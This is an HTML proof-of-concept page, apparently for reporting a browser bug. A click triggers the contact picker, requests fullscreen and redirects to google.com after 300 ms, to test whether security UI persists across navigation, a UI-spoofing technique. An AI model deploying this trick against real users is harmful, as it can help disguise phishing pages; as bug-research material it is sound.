<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Security UI Spoof - Redirect Test</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
        <style>
            body {
                margin: 0;
                padding: 0;
                display: flex;
                align-items: center;
                justify-content: center;
                height: 100vh;
                font-family: sans-serif;
            }
        </style>
        <script>
            onclick = async () => {
                // 1. Memicu dialog kontak (seperti pada PoC awal)
                (async () => {
                    try {
                        await navigator.contacts.select(["name"], {});
                    } catch (e) {
                        console.log("Contact picker ditutup/gagal");
                    }
                })();

                // 2. Masuk ke mode Fullscreen
                try {
                    if (document.documentElement.requestFullscreen) {
                        await document.documentElement.requestFullscreen();
                    }
                } catch (e) {
                    console.log("Fullscreen gagal");
                }

                // 3. Redirect ke Google dengan timeout 300ms
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 300);
            }
        </script>
    </head>  
    <body>
        <div id="content">
            <center>
                <h1>Click anywhere to trigger Fullscreen and Redirect!</h1>
                <p>Testing persistence of UI elements during navigation.</p>
            </center>
        </div>
    </body>
</html>
